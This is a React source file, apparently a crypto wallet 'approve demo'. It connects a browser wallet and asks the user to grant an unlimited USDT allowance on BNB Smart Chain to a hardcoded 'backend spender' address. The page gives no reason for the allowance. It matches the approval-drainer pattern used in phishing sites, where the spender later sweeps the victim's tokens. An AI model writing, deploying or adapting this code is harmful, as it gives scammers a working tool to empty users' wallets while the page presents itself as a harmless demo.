import React, { useState } from "react";
import { ethers } from "ethers";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT token
const BACKEND_SPENDER_ADDRESS = "0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee"; // <-- REPLACE THIS!

const USDT_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
];

function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [account, setAccount] = useState(null);
  const [txHash, setTxHash] = useState(null);
  const [loading, setLoading] = useState(false);

  // Connect wallet function
  async function connectWallet() {
    if (!window.ethereum) {
      alert("Please install MetaMask or Trust Wallet");
      return;
    }
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const _provider = new ethers.BrowserProvider(window.ethereum);
      const _signer = await _provider.getSigner();
      const address = await _signer.getAddress();

      setProvider(_provider);
      setSigner(_signer);
      setAccount(address);
      setTxHash(null);
    } catch (error) {
      console.error("Connection error:", error);
      alert("Failed to connect wallet");
    }
  }

  // Approve max USDT function
  async function approveMax() {
    if (!signer) {
      alert("Please connect your wallet first");
      return;
    }

    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const maxAmount = ethers.MaxUint256;

    try {
      setLoading(true);
      const tx = await usdtContract.approve(BACKEND_SPENDER_ADDRESS, maxAmount);
      setTxHash(tx.hash);
      await tx.wait();
      alert("Approval confirmed!");
    } catch (error) {
      console.error("Approval error:", error);
      alert("Approval failed: " + error.message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div style={{ maxWidth: 400, margin: "auto", padding: 20, fontFamily: "Arial" }}>
      <h2>USDT Approve Demo</h2>
      {!account ? (
        <button onClick={connectWallet} style={{ padding: "10px 20px", fontSize: 16 }}>
          Connect Wallet
        </button>
      ) : (
        <>
          <p>Connected: <b>{account}</b></p>
          <button
            onClick={approveMax}
            disabled={loading}
            style={{ padding: "10px 20px", fontSize: 16 }}
          >
            {loading ? "Approving..." : "Approve Max USDT"}
          </button>
          {txHash && (
            <p>
              Approval Tx Hash:{" "}
              <a
                href={`https://bscscan.com/tx/${txHash}`}
                target="_blank"
                rel="noreferrer"
              >
                {txHash.slice(0, 10)}...{txHash.slice(-8)}
              </a>
            </p>
          )}
        </>
      )}
    </div>
  );
}

export default App;
